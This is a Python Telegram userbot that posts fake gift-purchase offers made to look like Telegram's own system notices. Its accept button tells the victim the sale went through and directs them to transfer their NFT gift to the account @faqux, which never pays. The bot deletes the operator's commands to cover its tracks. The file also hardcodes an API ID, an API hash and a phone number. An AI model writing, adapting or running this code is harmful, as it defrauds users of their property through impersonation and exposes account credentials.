"""
Userbot для офферов.
Сообщения идут от твоего аккаунта.
"""

import re
import asyncio
from telethon import TelegramClient, events, Button

API_ID = 37207588
API_HASH = "dc2a827340e87161d8e45703ab3eb776"
PHONE = "+61480837622"
SESSION = "offer_session"

client = TelegramClient(SESSION, API_ID, API_HASH)

# chat_id -> last offer message id
last_offers = {}


def parse_gift(text: str):
    m = re.search(r't\.me/nft/([A-Za-z0-9]+)-(\d+)', text)
    if not m:
        return None
    name, num = m.group(1), m.group(2)
    gift_name = re.sub(r'([a-z])([A-Z])', r'\1 \2', name)
    stars = 7000
    for match in re.finditer(r'\b(\d{3,7})\b', text):
        val = int(match.group(1))
        if str(val) != num and 100 <= val <= 1000000:
            stars = val
            break
    slug = f"{name}-{num}"
    return {
        "gift_name": f"{gift_name} #{num}",
        "link": f"https://t.me/nft/{slug}",
        "stars": stars
    }


def build_offer(gift, stars, buyer="faqux"):
    return (
        f"{gift['link']}\n\n"
        f"Пользователь {buyer} предлагает Вам {stars} Stars за подарок {gift['gift_name']}.\n\n"
        f"Предложение действует ещё 5ч 59м."
    )


@client.on(events.NewMessage(outgoing=True, pattern=r'(?i)^/offer'))
async def cmd_offer(event):
    text = event.raw_text
    gift = parse_gift(text)
    if not gift:
        await event.reply("Кинь: /offer https://t.me/nft/IceCream-201001 5000")
        return

    msg = await event.respond(
        build_offer(gift, gift["stars"]),
        buttons=[
            [Button.inline("✗ Отклонить", b"dec"), Button.inline("✓ Принять", b"acc")]
        ]
    )
    last_offers[event.chat_id] = {"msg_id": msg.id, "gift": gift, "stars": gift["stars"]}
    await event.delete()  # удаляем команду


@client.on(events.NewMessage(outgoing=True, pattern=r'(?i)^/price\s+(\d+)'))
async def cmd_price(event):
    m = re.search(r'/price\s+(\d+)', event.raw_text, re.I)
    if not m:
        return
    new_stars = int(m.group(1))
    data = last_offers.get(event.chat_id)
    if not data:
        await event.reply("Нет активного оффера в этом чате")
        return

    gift = data["gift"]
    try:
        await client.edit_message(
            event.chat_id,
            data["msg_id"],
            build_offer(gift, new_stars),
            buttons=[
                [Button.inline("✗ Отклонить", b"dec"), Button.inline("✓ Принять", b"acc")]
            ]
        )
        data["stars"] = new_stars
        await event.delete()
    except Exception as e:
        await event.reply(f"Не смог изменить: {e}")


@client.on(events.CallbackQuery)
async def on_callback(event):
    data = event.data
    if data == b"dec":
        await event.edit("Предложение отклонено.", buttons=None)
        await event.answer("Отклонено")
    elif data == b"acc":
        info = last_offers.get(event.chat_id, {})
        stars = info.get("stars", 7000)
        gift_name = info.get("gift", {}).get("gift_name", "подарок")
        await event.edit(
            f"Предложение о продаже {gift_name} успешно принято.\n\n"
            f"Передайте подарок покупателю для зачисления {stars} Stars на ваш баланс.",
            buttons=[[Button.url("Передать", "https://t.me/faqux")]]
        )
        await event.respond(
            f"🎁 Подарок: {gift_name} успешно продан!\n\n"
            f"• Передайте подарок покупателю для зачисления Stars."
        )
        await event.answer("Принято")


async def main():
    await client.start(phone=PHONE)
    print("Userbot запущен. Пиши /offer в любом чате.")
    await client.run_until_disconnected()


if __name__ == "__main__":
    asyncio.run(main())
